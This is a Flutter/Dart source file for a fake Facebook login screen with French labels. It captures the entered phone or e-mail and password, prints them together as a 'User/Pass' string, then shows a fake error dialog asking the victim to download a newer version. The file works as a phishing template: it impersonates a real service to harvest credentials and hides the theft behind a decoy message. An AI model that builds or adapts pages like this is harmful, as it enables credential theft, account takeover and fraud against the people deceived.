import 'package:flutter/material.dart';

class LogIn extends StatefulWidget {
  @override
  _LogInState createState() => _LogInState();
}

class _LogInState extends State<LogIn> {
  String user;
  String pass;
  @override
  Widget build(BuildContext context) {
    return Scaffold(
        body: Center(
            child: ListView(
              //crossAxisAlignment: CrossAxisAlignment.start,
            children: [
        Container(
            height: 30,
            color: Colors.blue,
            child: Center(
              child: Text("Facebook", style: TextStyle(color: Colors.white)),
            ),
          ),
        
        Container(
          child:
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text("Numéro du mobile ou e-mail:"),
            TextField(
              onChanged: (value) {
                user = value;
              },
            ),
            Text("Mot de passe:"),
            TextField(
              onChanged: (value) {
                pass = value;
              },
              
            ),
            SizedBox(
              width: MediaQuery.of(context).size.width,
              child: RaisedButton(
                color: Colors.blue,
                onPressed: () {
                  String all;
                  all = "User: $user \n Pass: $pass";
                  print(all);
                  showDialog(
                    context: context,
                    child: SizedBox(
                      width:MediaQuery.of(context).size.width/4,
                      child:Dialog(
                      child:Container(
                      //padding: EdgeInsets.only(top:,bottom:MediaQuery.of(context).size.width/4),
                      child:Column(
                        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text("Erreur",style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
                          Text("Veuillez telecharger une version plus recente...",style: TextStyle(color: Colors.black)),
                      ],)
                      )
                    )
                    )
                  );
                },
                child: Text("Connexion",
                    style: TextStyle(
                        color: Colors.white, fontWeight: FontWeight.bold)),
              ),
            ),
            Text("Mot de passe oublié?", style: TextStyle(color: Colors.blue))
          ]),
        ),
        Container(
          child: Center(
              child: Column(
            children: [
              Text("ou"),
              SizedBox(
              width: MediaQuery.of(context).size.width/3,
              child: RaisedButton(
                color: Colors.green,
                onPressed: () {
                  print("hey");
                },
                child: Text("Créer un compte",
                    style: TextStyle(
                        color: Colors.white, fontWeight: FontWeight.bold)),
              ),
            ),
            ],
          )),
        ),
        Container(
          padding: EdgeInsets.only(top:25),
          child:Column(
            children: [
              Text("Malagasy", style: TextStyle(color: Colors.blue)),
              Text("Français(France)", style: TextStyle(color: Colors.black)),
              Text("English(US)", style: TextStyle(color: Colors.blue)),
              Text("Autres langues...", style: TextStyle(color: Colors.blue)),
            ]
          )
        )
      ],
    )));
  }
}
